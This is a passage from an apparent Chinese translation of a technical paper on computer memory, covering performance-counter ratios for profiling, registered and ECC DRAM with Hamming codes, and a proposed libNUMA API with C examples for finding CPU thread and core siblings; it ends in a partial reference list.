开始分析</h2><p>当开始分析一段代码时，我们当然可以从程序中花费最长时间的地方开始。那段代码当然应该尽可能地优化。但接下来会发生什么呢？程序在哪里花费了不必要的时间？</p><p>这个问题不容易回答。</p><p>这种情况下的一个问题是，绝对值并不说明真实情况。程序中的一个循环可能需要大部分时间，这是可以的。高CPU利用率有很多可能的原因。但更常见的是，CPU使用率更均匀地分布在整个程序中。在这种情况下，绝对值指向许多地方，这是没有用的。</p><p>在许多情况下，查看两个事件的比率是有帮助的。例如，一个函数中错误预测的分支数量如果没有对函数执行频率的度量，那么这个绝对值就没有意义。是的，绝对值与程序的性能相关。每次调用错误预测的比率对函数的代码质量更有意义。Intel的x86和x86-64优化手册[intendopt]描述了应该调查的比率（引用文档的核心2事件附录B.7）。与内存处理相关的一些相关比率如下。</p><table><thead><tr><th></th><th></th><th></th></tr></thead><tbody><tr><td>指令获取暂停</td><td><code>CYCLES_L1I_MEM_STALLED</code> &#x2F;<br><code>CPU_CLK_UNHALTED.CORE</code></td><td>由于缓存或ITLB未命中，导致指令解码器等待新数据的周期比率。</td></tr><tr><td>ITLB未命中率</td><td><code>ITLB_MISS_RETIRED</code> &#x2F; <code>INST_RETIRED.ANY</code></td><td>每个指令的ITLB未命中。如果此比率高，则代码分布在太多页面上。</td></tr><tr><td>L1I未命中率</td><td><code>L1I_MISSES</code> &#x2F; <code>INST_RETIRED.ANY</code></td><td>每个指令的L1i未命中。执行流是不可预测的或代码大小太大。在前一种情况下，避免间接<br>跳转可能会有所帮助。在后一种情况下，块重新排序或避免<br>内联可能会有所帮助。</td></tr><tr><td>L2指令未命中率</td><td><code>L2_IFETCH.SELF.I_STATE</code> &#x2F;<br><code>INST_RETIRED.ANY</code></td><td>每个指令的L2未命中程序代码。任何大于零的值表明代码局部性问题比L1i未命中更严重。</td></tr><tr><td>装载率</td><td><code>L1D_CACHE_LD.MESI</code> &#x2F; <code>CPU_CLK_UNHALTED.CORE</code></td><td>每个周期的读取操作。Core 2核心可以服务一个装载<br>操作。高比率意味着执行受内存<br>读取限制。</td></tr><tr><td>存储顺序阻塞</td><td><code>STORE_BLOCK.ORDER</code> &#x2F;<br><code>CPU_CLK_UNHALTED.CORE</code></td><td>由于先前的存储未命中缓存，存储被阻塞的比率。</td></tr><tr><td>L1d阻塞加载率</td><td><code>LOAD_BLOCK.L1D</code> &#x2F;<br><code>CPU_CLK_UNHALTED.CORE</code></td><td>由于缺乏资源，L1d阻止的加载。通常这意味着太多的并发L1d访问。</td></tr><tr><td>L1D未命中率</td><td><code>L1D_REPL</code> &#x2F; <code>INST_RETIRED.ANY</code></td><td>每个指令的L1d未命中。高比率意味着预取无效，L2使用得太频繁。</td></tr><tr><td>L2数据未命中率</td><td><code>L2_LINES_IN.SELF.ANY</code> &#x2F;<br><code>INST_RETIRED.ANY</code></td><td>每个指令的数据L2未命中。如果值显著<br>大于零，则硬件和软件预取无效。处理器需要更多（或更早）的软件预取帮助。</td></tr><tr><td>L2需求未命中率</td><td><code>L2_LINES_IN.SELF.DEMAND</code> &#x2F;<br><code>INST_RETIRED.ANY</code></td><td>硬件预取器根本没有使用的每个指令的数据L2未命中。这意味着，预取甚至还没有开始。</td></tr><tr><td>有用的NTA预取率</td><td><code>SSE_PRE_MISS.NTA</code> &#x2F;<br><code>SSS_PRE_EXEC.NTA</code></td><td>相对于所有非时间性预取的总数，有用的非时间性预取的比率。低值意味着许多值已经在缓存中。这个比率也可以为其他预取类型计算。</td></tr><tr><td>晚期NTA预取率</td><td><code>LOAD_HIT_PRE</code> &#x2F; <code>SSS_PRE_EXEC.NTA</code></td><td>相对于所有非时间性预取的总数，具有正在进行的预取的数据的加载请求的比率。高值意味着软件预取指令发出得太晚了。这个比率也可以为其他预取类型计算。</td></tr></tbody></table><p>对于所有这些比率，程序应该运行时指导oprofile测量两个事件。这保证了两个计数是可比较的。在除法之前，必须确保考虑了可能不同的溢出值。最简单的方法是通过将每个事件的计数乘以溢出值来确保这一点。</p><p>这些比率对于整个程序、可执行文件&#x2F;DSO级别，甚至函数级别都是有意义的。越深入地查看程序，包含在值中的错误就越多。</p><p>为了使比率有意义，需要基线值。这并不像看起来那么简单。不同类型的代码具有不同的特性，一个程序中的比率值可能很糟糕，而在另一个程序中可能是正常的。</p><h2 id="11-内存类型"><a href="#11-内存类型" class="headerlink" title="11 内存类型"></a>11 内存类型</h2><p>尽管对于高效编程并非必要知识，但描述一些内存类型的更多技术细节可能是有用的。具体来说，我们在这里感兴趣的是“注册”与“未注册”以及ECC与非ECC DRAM类型之间的区别。</p><p>“注册”和“缓冲”这两个术语在描述带有DRAM模块上一个额外组件的DRAM类型时可以互换使用：一个缓冲区。所有DDR内存类型都可以是注册和未注册的形式。对于未注册的模块，内存控制器直接连接到模块上的所有芯片上。图11.1显示了设置。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404292343846.png"><br><strong>图11.1：未注册的DRAM模块</strong></p><p>从电气角度来看，这是相当苛刻的。内存控制器必须能够处理所有内存芯片的容量（图中显示的六个芯片以上）。如果内存控制器（MC）有限制，或者要使用许多内存模块，这种设置并不理想。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404292343494.png"><br><strong>图11.2：注册DRAM模块</strong></p><p>缓冲（或注册）内存改变了这种情况：RAM芯片不是直接连接到DRAM模块上的内存，而是连接到一个缓冲区，然后该缓冲区再连接到内存控制器。这显著降低了电气连接的复杂性。内存控制器驱动DRAM模块的能力增加了与节省的连接数相对应的因子。</p><p>有了这些优势，问题是：为什么不是所有的DRAM模块都是缓冲的？有几个原因。显然，缓冲模块有点复杂，因此更昂贵。成本不是唯一的因素。缓冲区稍微延迟了来自RAM芯片的信号；延迟必须足够长，以确保来自RAM芯片的所有信号都被缓冲。结果是，DRAM模块的延迟增加了。这里值得一提的最后一个因素是，额外的电子元件增加了能源成本。由于缓冲区必须以总线频率运行，因此该组件的能源消耗可能相当大。</p><p>考虑到DDR2和DDR3模块的其他因素，通常不可能每个存储体有超过两个DRAM模块。内存控制器的引脚数量限制了存储体的数量（在商品硬件中为两个）。大多数内存控制器能够驱动四个DRAM模块，因此未注册模块就足够了。在具有高内存需求的服务器环境中，情况可能会有所不同。</p><p>服务器环境的另一个方面是它们不能容忍错误。由于RAM单元中电容器保持的微小电荷，可能会出现错误。人们经常开玩笑说宇宙辐射，但这确实是可能的。加上阿尔法衰变和其他自然现象，它们导致RAM单元中的内容从0变为1或反之亦然。使用的内存越多，发生此类事件的可能性就越大。</p><p>如果这样的错误是不可接受的，可以使用ECC（错误校正码）DRAM。错误校正码使硬件能够识别不正确的单元内容，并在某些情况下纠正错误。在旧时代，奇偶校验只识别错误，并且当检测到错误时必须停止机器。有了ECC，相反，少量的错误位可以自动纠正。如果错误数量太多，则无法正确执行内存访问，机器仍然会停止。然而，对于工作DRAM模块来说，这种情况相当不可能，因为必须在同一模块上发生多个错误。</p><p>当我们谈论ECC内存时，我们实际上并不完全正确。不是内存执行错误检查；相反，是内存控制器。DRAM模块只是提供更多的存储，并与实际数据一起传输额外的非数据位。通常，ECC内存存储每8位数据的1位额外位。为什么使用8位将在后面解释。</p><p>在将数据写入内存地址时，内存控制器在将数据和ECC传输到内存总线之前，会实时计算新内容的ECC。当读取时，接收到数据和ECC，内存控制器计算数据的ECC，并将其与从DRAM模块传输的ECC进行比较。如果ECC匹配，一切正常。如果不匹配，内存控制器尝试纠正错误。如果无法进行此纠正，则记录错误，机器可能会停止。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404292344937.png"><br><strong>表11.1：ECC和数据位的关系</strong></p><p>几种错误校正技术在使用中，但对于DRAM ECC，通常使用汉明码。汉明码最初用于使用能够识别和纠正一个翻转位（SEC，单错误校正）的能力对四个数据位进行编码。该机制可以轻松扩展到更多的数据位。数据位W的数量与错误代码位E的数量之间的关系由方程描述</p><p>E &#x3D; ⌈log2 (W+E+1)⌉</p><p>迭代求解这个方程得到表11.1第二列中的值。通过增加一个位，我们可以使用一个简单的奇偶校验位识别两个翻转位。这被称为SEC&#x2F;DED，单错误校正&#x2F;双错误检测。通过这个额外的位，我们得到了表11.1第四列中的值。对于W&#x3D;64的开销足够低，数字（64,8）是8的倍数，所以这是ECC的一个自然选择。在大多数模块上，每个RAM芯片产生8位，因此任何其他组合都会导致不太有效的解决方案。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404292344608.png"><br><strong>图11.3：汉明生成矩阵构造</strong></p><p>使用W&#x3D;4和E&#x3D;3的代码可以轻松演示汉明码计算。我们在编码字的战略位置计算奇偶校验位。图11.3显示了原则。在对应于二的幂的位位置上添加了奇偶校验位。第一个奇偶校验位P1的奇偶校验和包含每第二个位。第二个奇偶校验位P2的奇偶校验和包含数据位1、3和4（这里编码为3、6和7）。类似地计算P4。</p><p><img src="https://picgo-ysc.oss-cn-shenzhen.aliyuncs.com/web/202404292344118.png"></p><p>可以使用矩阵乘法更优雅地描述奇偶校验位的计算。我们构造一个矩阵G &#x3D; [I|A]，其中I是单位矩阵，A是我们可以从图11.3中确定的奇偶校验生成矩阵。现在，如果我们将每个输入数据项表示为一个4维向量d，我们可以计算r&#x3D;d⋅G并得到一个7维向量r。这就是在ECC DDR的情况下存储的数据。</p><p>要解码数据，我们构造一个新的矩阵H&#x3D;[AT|I]，其中AT是计算G时的奇偶校验生成矩阵的转置。这意味着：</p><p>H⋅r的结果显示存储的数据是否有缺陷。如果没有，乘积是三维向量(0 0 0)T。否则，乘积的值，当解释为数字的二进制表示时，表示翻转位的列号。内存控制器可以纠正该位，程序将不会注意到存在问题。</p><p>处理DED部分的额外位只是稍微复杂一些。通过更多的努力，可以创建可以纠正两个翻转位甚至更多的代码。是概率和风险决定是否需要这样做。一些内存制造商表示，每750小时可以在256MB的RAM中发生一次错误。通过加倍内存量，时间减少了75％。有足够的内存，在短时间内经历错误的概率可以是显著的，ECC RAM成为必需。时间框架甚至可能如此之小，以至于SEC&#x2F;DED实现甚至不足够。</p><p>而不是实现更多的错误校正能力，服务器主板有能力在给定的时间框架内自动读取所有内存。这意味着，无论内存是否实际被处理器请求，内存控制器都会读取数据，如果ECC检查失败，则将已纠正的数据写回内存。只要在读取所有内存并将其写回所需的时间框架内发生少于两个内存错误的概率是可以接受的，SEC&#x2F;DED错误校正是一个完全合理的解决方案。</p><p>与注册DRAM一样，必须问的问题是：为什么ECC DRAM不是常态？这个问题的答案与注册RAM的等效问题相同：额外的RAM芯片增加了成本，奇偶校验计算增加了延迟。未注册的，非ECC内存可以显著更快。由于注册和ECC DRAM的问题相似，通常只找到注册的，ECC DRAM，而不是未注册的，非ECC DRAM。</p><p>另一种克服内存错误的方法。一些制造商提供所谓的“内存RAID”，其中数据在多个DRAM模块或至少RAM芯片上冗余分布。具有此功能的主板可以使用未注册的DRAM模块，但内存总线上增加的流量可能会抵消ECC和非ECC DRAM模块的访问时间差异。</p><h2 id="12-libNUMA介绍"><a href="#12-libNUMA介绍" class="headerlink" title="12 libNUMA介绍"></a>12 libNUMA介绍</h2><p>尽管程序员需要的许多信息，如调度线程，适当分配内存等，都是可用的，但获取这些信息却相当繁琐。现有的NUMA支持库（libnuma，在RHEL&#x2F;Fedora系统上的numactl包中）远未提供足够的功能。</p><p>作为响应，作者提出了一个新的库，提供NUMA所需的所有功能。由于内存和缓存层次结构处理的重叠，这个库对于非NUMA系统上的多线程和多核处理器也也很有用——几乎所有当前可用的机器。</p><p>这个新库的功能迫切需要遵循本文档中的建议。这就是这里提到它的唯一原因。该库（截至撰写本文时）尚未完成，未经审查，未经打磨，并且未广泛分发。它在未来可能会发生显著变化。它目前在 <a href="http://people.redhat.com/drepper/libNUMA.tar.bz2">http://people.redhat.com/drepper/libNUMA.tar.bz2</a> 上可用。</p><p>这个库的接口严重依赖于 <code>/sys</code> 文件系统导出的信息。如果该文件系统未挂载，许多函数将简单地失败或提供不准确的信息。如果进程在 <code>chroot</code> 监狱中执行，这一点尤其重要要记住。</p><p>库的接口头包含当前以下定义：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">typedef</span> <span class="hljs-type">memnode_set_t</span>;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MEMNODE_ZERO_S(setsize, memnodesetp)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MEMNODE_SET_S(node, setsize, memnodesetp)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MEMNODE_CLR_S(node, setsize, memnodesetp)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MEMNODE_ISSET_S(node, setsize, memnodesetp)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MEMNODE_COUNT_S(setsize, memnodesetp)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MEMNODE_EQUAL_S(setsize, memnodesetp1, memnodesetp2)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MEMNODE_AND_S(setsize, destset, srcset1, srcset2)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MEMNODE_OR_S(setsize, destset, srcset1, srcset2)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MEMNODE_XOR_S(setsize, destset, srcset1, srcset2)</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MEMNODE_ALLOC_SIZE(count)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MEMNODE_ALLOC(count)</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MEMNODE_FREE(memnodeset)</span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">NUMA_cpu_system_count</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">NUMA_cpu_system_mask</span><span class="hljs-params">(<span class="hljs-type">size_t</span> destsize, <span class="hljs-type">cpu_set_t</span> *dest)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">NUMA_cpu_self_count</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">NUMA_cpu_self_mask</span><span class="hljs-params">(<span class="hljs-type">size_t</span> destsize, <span class="hljs-type">cpu_set_t</span> *dest)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">NUMA_cpu_self_current_idx</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">NUMA_cpu_self_current_mask</span><span class="hljs-params">(<span class="hljs-type">size_t</span> destsize, <span class="hljs-type">cpu_set_t</span> *dest)</span>;<br><br><span class="hljs-type">ssize_t</span> <span class="hljs-title function_">NUMA_cpu_level_mask</span><span class="hljs-params">(<span class="hljs-type">size_t</span> destsize, <span class="hljs-type">cpu_set_t</span> *dest,</span><br><span class="hljs-params">                            <span class="hljs-type">size_t</span> srcsize, <span class="hljs-type">const</span> <span class="hljs-type">cpu_set_t</span> *src,</span><br><span class="hljs-params">                            <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> level)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">NUMA_memnode_system_count</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">NUMA_memnode_system_mask</span><span class="hljs-params">(<span class="hljs-type">size_t</span> destsize, <span class="hljs-type">memnode_set_t</span> *dest)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">NUMA_memnode_self_mask</span><span class="hljs-params">(<span class="hljs-type">size_t</span> destsize, <span class="hljs-type">memnode_set_t</span> *dest)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">NUMA_memnode_self_current_idx</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">NUMA_memnode_self_current_mask</span><span class="hljs-params">(<span class="hljs-type">size_t</span> destsize, <span class="hljs-type">memnode_set_t</span> *dest)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">NUMA_cpu_to_memnode</span><span class="hljs-params">(<span class="hljs-type">size_t</span> cpusetsize, <span class="hljs-type">const</span> <span class="hljs-type">cpu_set_t</span> *cpuset,</span><br><span class="hljs-params">                       <span class="hljs-type">size_t</span> __memnodesize, <span class="hljs-type">memnode_set_t</span> *memnodeset)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">NUMA_memnode_to_cpu</span><span class="hljs-params">(<span class="hljs-type">size_t</span> memnodesize, <span class="hljs-type">const</span> <span class="hljs-type">memnode_set_t</span> *memnodeset,</span><br><span class="hljs-params">                       <span class="hljs-type">size_t</span> cpusetsize, <span class="hljs-type">cpu_set_t</span> *cpuset)</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">NUMA_mem_get_node_idx</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr)</span>;<br><span class="hljs-type">int</span> <span class="hljs-title function_">NUMA_mem_get_node_mask</span><span class="hljs-params">(<span class="hljs-type">void</span> *addr, <span class="hljs-type">size_t</span> size,</span><br><span class="hljs-params">                           <span class="hljs-type">size_t</span> destsize, <span class="hljs-type">memnode_set_t</span> *dest)</span>;<br></code></pre></td></tr></table></figure><p><code>MEMNODE_*</code> 宏在形式和功能上类似于第6.4.3节中引入的 <code>CPU_*</code> 宏。没有非 <code>_S</code> 变体的宏，它们都需要一个大小参数。<code>memnode_set_t</code> 类型相当于 <code>cpu_set_t</code>，但这次是针对内存节点的。请注意，内存节点的数量不需要与CPU的数量有任何关系，反之亦然。可以有一个内存节点对应多个CPU，甚至没有CPU。因此，动态分配的内存节点位集的大小不应由CPU的数量决定。</p><p>相反，应该使用 <code>NUMA_memnode_system_count</code> 接口。它返回当前注册的节点数。这个数字可能会随着时间的推移增长或缩小。然而，通常情况下，它会保持不变，因此是用于大小内存节点位集的好值。分配再次类似于 <code>CPU_</code> 宏，使用 <code>MEMNODE_ALLOC_SIZE</code>、<code>MEMNODE_ALLOC</code> 和 <code>MEMNODE_FREE</code> 进行。</p><p>作为与 <code>CPU_*</code> 宏的最后并行，库还提供了比较内存节点位集是否相等和执行逻辑操作的宏。</p><p><code>NUMA_cpu_*</code> 函数提供处理CPU集的功能。部分接口只是使现有功能以新名称可用。<code>NUMA_cpu_system_count</code> 返回系统中的CPU数量，<code>NUMA_CPU_system_mask</code> 变体返回设置了适当位的位掩码——这是其他方式无法获得的功能。</p><p><code>NUMA_cpu_self_count</code> 和 <code>NUMA_cpu_self_mask</code> 返回有关当前线程当前被允许在其上运行的CPU的信息。<code>NUMA_cpu_self_current_idx</code> 返回当前使用的CPU的索引。</p><p>此信息可能在返回时已经过时，由于内核可以做出的调度决策；必须始终假定其不准确。<code>NUMA_cpu_self_current_mask</code> 返回相同的信息，并在位集中设置了适当的位。</p><p><code>NUMA_memnode_system_count</code> 已经介绍过了。<code>NUMA_memnode_system_mask</code> 是等效的函数，它填充一个位集。<code>NUMA_memnode_self_mask</code> 根据线程当前可以运行的任何CPU直接连接的内存节点填充一个位集。</p><p><code>NUMA_memnode_self_current_idx</code> 和 <code>NUMA_memnode_self_current_mask</code> 返回更专门的信息。返回的信息是连接到线程当前正在运行的处理器的内存节点。正如对于 <code>NUMA_cpu_self_current_*</code> 函数一样，当函数返回时，此信息可能已经过时；它只能作为提示使用。</p><p><code>NUMA_cpu_to_memnode</code> 函数可用于将一组CPU映射到直接连接的内存节点集。如果CPU设置中只设置了单个位，则可以确定每个CPU属于哪个内存节点。目前，Linux并不支持单个CPU属于超过一个内存节点；理论上，这在未来可能会改变。为了在另一个方向上进行映射，可以使用 <code>NUMA_memnode_to_cpu</code> 函数。</p><p>如果内存已经被分配，有时了解其被分配的位置是有用的。这就是 <code>NUMA_mem_get_node_idx</code> 和 <code>NUMA_mem_get_node_mask</code> 允许程序员确定的。前者返回由参数指定的地址对应的页面被分配的内存节点的索引——或者根据当前安装的策略，如果页面尚未分配，将被分配。第二个函数可以为整个地址范围执行工作；它以位集的形式返回信息。函数的返回值是使用的不同内存节点的数量。</p><p>在本节的其余部分，我们将看到这些接口的一些用例示例。在所有情况下，我们跳过错误处理和CPU和&#x2F;或内存节点的数量对于 <code>cpu_set_t</code> 和 <code>memnode_set_t</code> 类型分别过大的情况。使代码健壮是留给读者作为练习的。</p><h3 id="12-1-确定给定CPU的线程兄弟"><a href="#12-1-确定给定CPU的线程兄弟" class="headerlink" title="12.1 确定给定CPU的线程兄弟"></a>12.1 确定给定CPU的线程兄弟</h3><p>要调度辅助线程，或者从被调度在给定CPU的线程上受益的其他线程，可以使用以下代码序列。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">cpu_set_t</span> cur;<br>CPU_ZERO(&amp;cur);<br>CPU_SET(cpunr, &amp;cur);<br><span class="hljs-type">cpu_set_t</span> hyperths;<br>NUMA_cpu_level_mask(<span class="hljs-keyword">sizeof</span>(hyperths), &amp;hyperths, <span class="hljs-keyword">sizeof</span>(cur), &amp;cur, <span class="hljs-number">1</span>);<br>CPU_CLR(cpunr, &amp;hyperths);<br></code></pre></td></tr></table></figure><p>该代码首先为由 <code>cpunr</code> 指定的CPU生成一个位集。然后将此位集与第五个参数一起传递给 <code>NUMA_cpu_level_mask</code>，该参数指定我们正在寻找超线程。结果返回在 <code>hyperths</code> 位集中。剩余要做的就是清除对应于原始CPU的位。</p><h3 id="12-2-确定给定CPU的核心兄弟"><a href="#12-2-确定给定CPU的核心兄弟" class="headerlink" title="12.2 确定给定CPU的核心兄弟"></a>12.2 确定给定CPU的核心兄弟</h3><p>如果两个线程不应被调度在两个超线程上，但可以从缓存共享中受益，我们需要确定处理器的其他核心。以下代码序列可以完成此操作。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">cpu_set_t</span> cur;<br>CPU_ZERO(&amp;cur);<br>CPU_SET(cpunr, &amp;cur);<br><span class="hljs-type">cpu_set_t</span> hyperths;<br><span class="hljs-type">int</span> nhts = NUMA_cpu_level_mask(<span class="hljs-keyword">sizeof</span>(hyperths), &amp;hyperths, <span class="hljs-keyword">sizeof</span>(cur), &amp;cur, <span class="hljs-number">1</span>);<br><span class="hljs-type">cpu_set_t</span> coreths;<br><span class="hljs-type">int</span> ncs = NUMA_cpu_level_mask(<span class="hljs-keyword">sizeof</span>(coreths), &amp;coreths, <span class="hljs-keyword">sizeof</span>(cur), &amp;cur, <span class="hljs-number">2</span>);<br>CPU_XOR(&amp;coreths, &amp;coreths, &amp;hyperths);<br>ncs -= nhts;<br></code></pre></td></tr></table></figure><p>代码的第一部分与确定超线程的代码相同。这不是巧合，因为我们必须区分给定CPU的超线程与其他核心。这是通过调用 <code>NUMA_cpu_level_mask</code> 的第二部分实现的，但这次级别为2。剩余要做的就是从结果中移除给定CPU的所有超线程。<code>nhts</code> 和 <code>ncs</code> 变量用于跟踪相应位集中设置的位数。</p><p>生成的掩码可用于调度另一个线程。如果不需要显式调度其他线程，则使用核心的决定可以留给操作系统。否则，可以迭代地运行以下代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">while</span> (ncs &gt; <span class="hljs-number">0</span>) &#123;<br>   <span class="hljs-type">size_t</span> idx = <span class="hljs-number">0</span>;<br>   <span class="hljs-keyword">while</span> (!CPU_ISSET(idx, &amp;ncs))<br>      ++idx;<br>   CPU_ZERO(&amp;cur);<br>   CPU_SET(idx, &amp;cur);<br>   nhts = NUMA_cpu_level_mask(<span class="hljs-keyword">sizeof</span>(hyperths), &amp;hyperths, <span class="hljs-keyword">sizeof</span>(cur), &amp;cur, <span class="hljs-number">1</span>);<br>   CPU_XOR(&amp;coreths, &amp;coreths, &amp;hyperths);<br>   ncs -= nhts;<br><br>   <span class="hljs-comment">// ... 在CPU idx上调度线程 ...</span><br>&#125;<br></code></pre></td></tr></table></figure><p>循环在每次迭代中从剩余的、使用的核中选择一个CPU编号。然后它计算这个CPU的所有超线程。得到的结果位集然后从可用核的位集中减去（使用 <code>CPU_XOR</code>）。如果XOR操作没有移除任何东西，那么真的出了问题。<code>ncs</code> 变量已更新，我们准备好了下一轮，但在做出调度决定之前，我们还没有准备好。最后，任何 <code>idx</code>、<code>cur</code> 或 <code>hyperths</code> 都可以用来调度线程，这取决于程序的要求。通常最好尽可能让操作系统自由，因此使用 <code>hyperths</code> 位集，以便操作系统可以选择最佳的超线程。</p><h2 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h2><ul><li>[amdccnuma]<br>Performance guidelines for amd athlon™ 64 and amd opteron™ ccnuma multiprocessor systems. Advanced Micro Devices, 2006.</li><li>[arstechtwo]<br>Stokes, Jon &#96;&#96;Hannibal’’. Ars Technica RAM Guide, Part II: Asynchronous and Synchronous DRAM. <a href="http://arstechnica.com/paedia/r/ram_guide/ram_guide.part2-1.html">http://arstechnica.com/paedia/r/ram_guide/ram_guide.part2-1.html</a>, 2004.</li><li>[continuous]<br>Anderson, Jennifer M., Lance M. Berc, Jeffrey Dean, Sanjay Ghemawat, Monika R. Henzinger, Shun-Tak A. Leung, Richard L. Sites, Mark T. Vandevoorde, Carl A. Waldspurger and William E. Weihl. Continuous profiling: Where have all the cycles gone. Proceedings of the 16th acm symposium of operating systems principles, pages 1–14. 1997.</li><li>[dcas]<br>Doherty, Simon, David L. Detlefs, Lindsay Grove, Christine H. Flood, Victor Luchangco, Paul A. Martin, Mark Moir, Nir Shavit and Jr. Guy L. Steele. DCAS is not a Silver Bullet for Nonblocking Algorithm Design. Spaa ‘04: proceedings of the sixteenth annual acm symposium on parallelism in algorithms and architectures, pages 216–224. New York, NY, USA, 2004. ACM Press.</li><li>[ddrtwo]<br>Dowler, M. Introduction to DDR-2: The DDR Memory Replacement. <a href="http://www.pcstats.com/articleview.cfm?articleID=1573">http://www.pcstats.com/articleview.cfm?articleID=1573</a>, 2004.</li><li>[directcacheaccess]<br>Huggahalli, Ram, Ravi Iyer and Scott Tetrick. Direct Cache Access for High Bandwidth Network I&#x2F;O. , 2005.</li><li>[dwarves]<br>Melo, Arnaldo Carvalho de. The 7 dwarves: debugging information beyond gdb. Proceedings of the linux symposium. 2007.</li><li>[futexes]<br>Drepper, Ulrich. Futexes Are Tricky., 2005. <a href="http://people.redhat.com/drepper/futex.pdf">http://people.redhat.com/drepper/futex.pdf</a>.</li><li>[goldberg]<br>Goldberg, David. What Every Computer Scientist Should Know About Floating-Point Arithmetic. ACM Computing Surveys, 23(1):5–48, 1991.</li><li>[highperfdram]<br>Cuppu, Vinodh, Bruce Jacob, Brian Davis and Trevor Mudge. High-Performance DRAMs in Workstation Environments. IEEE Transactions on Computers, 50(11):1133–1153, 2001.</li><li>[htimpact]<br>Margo, William, Paul Petersen and Sanjiv Shah. Hyper-Threading Technology: Impact on Compute-Intensive Workloads. Intel Technology Journal, 6(1), 2002.</li><li>[intelopt]<br>Intel 64 and ia-32 architectures optimization reference manual. Intel Corporation, 2007.</li><li>[lockfree]<br>Fober, Dominique, Yann Orlarey and Stephane Letz. Lock-Free Techiniques for Concurrent Access to Shared Objects. In GMEM, editor, Actes des journées d’informatique musicale jim2002, marseille, pages 143–150. 2002.</li><li>[micronddr]<br>Double Data Rate (DDR) SDRAM MT46V. Micron Technology, 2003.</li><li>[mytls]<br>Drepper, Ulrich. ELF Handling For Thread-Local Storage. Technical report, Red Hat, Inc., 2003.</li><li>[nonselsec]<br>Drepper, Ulrich. Security Enhancements in Red Hat Enterprise Linux. , 2004.</li><li>[oooreorder]<br>McNamara, Caolán. Controlling symbol ordering. <a href="http://blogs.linux.ie/caolan/2007/04/24/controlling-symbol-ordering/">http://blogs.linux.ie/caolan/2007/04/24/controlling-symbol-ordering/</a>, 2007.</li><li>[sramwiki]<br>Wikipedia. Static random access memory. <a 